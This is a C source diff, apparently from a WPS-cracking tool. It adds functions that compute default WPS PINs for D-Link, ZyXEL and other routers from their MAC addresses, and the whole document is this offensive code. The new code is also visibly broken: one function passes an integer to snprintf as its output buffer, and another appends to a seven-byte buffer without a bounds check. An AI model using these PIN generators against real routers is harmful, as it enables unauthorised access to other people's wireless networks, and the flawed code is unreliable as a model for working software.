@@ -543,13 +543,10 @@ Tactical Network Solutions
 http://www.devttys0.com/2014/10/reversing-d-links-wps-pin-algorithm/
 */
 
-int pingen_dlink(char *mac, char *serial, int len_serial, int add)
+int pingen_dlink(char *mac, int add)
 {
-    int mac_len=0, serial_len=0, nic=0, pin=0;
+    int nic=0, pin=0;
     char buff[10];
-
-    mac_len = strlen(mac);
-    serial_len = len_serial;
 
     nic = hexToInt(strncpy(buff, mac+6, sizeof(buff)));
     nic = nic + add;
@@ -569,4 +566,50 @@ int pingen_dlink(char *mac, char *serial, int len_serial, int add)
     }
 
     return (pin * 10) + wps_checksum(pin);
+}
+
+//Zhaochunsheng algorithm/
+int pingen_zhaochunsheng(char *mac, int add)
+{
+    int default_pin=0, pin=0, i=0, pin_len = 9;
+    //char *bssid = mac2str(get_bssid(), ':');
+    char *bssid_copy = (char *)malloc(strlen(mac) + 1);
+    char *bssid_parts, temp[7] = { 0 };
+
+    strcpy(bssid_copy, mac);
+    bssid_parts = strtok(bssid_copy, ":");
+
+    while(bssid_parts)
+    {
+        if(i > 2)
+        {
+            strcat(temp, bssid_parts);
+        }
+
+        bssid_parts = strtok(NULL, ":");
+        ++i;
+    }
+
+    temp[6] = '\0';
+    sscanf(temp, "%x", &default_pin);
+    default_pin = default_pin % 10000000;
+
+    snprintf(pin, pin_len, "%08d", (default_pin * 10) + wps_checksum(default_pin));
+
+    return pin;
+}
+
+//mac to decimal by kib0rg
+int pingen_zyxel(char *mac, int add)
+{
+    //pingen make by kib0rg, a little change by t6x
+    int pin;
+
+    char mac_address[7] = {0};
+ 
+    sprintf(mac_address, "%c%c%c%c%c%c", mac[6], mac[7], mac[8], mac[9], mac[10], mac[11]);
+
+    pin = (hexToInt(mac_address) + add) % 10000000;
+
+    return (pin * 10) + wps_pin_checksum(pin);
 }
